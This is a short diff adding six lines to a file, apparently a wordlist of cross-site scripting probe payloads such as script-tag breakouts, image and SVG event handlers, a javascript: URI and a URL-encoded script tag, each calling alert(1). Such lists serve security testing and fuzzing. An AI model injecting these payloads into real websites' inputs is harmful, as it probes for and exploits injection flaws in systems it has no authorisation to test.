@@ -1,0 +1,6 @@
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+javascript:alert(1)
+%3Cscript%3Ealert(1)%3C/script%3E
+<body onload=alert(1)>
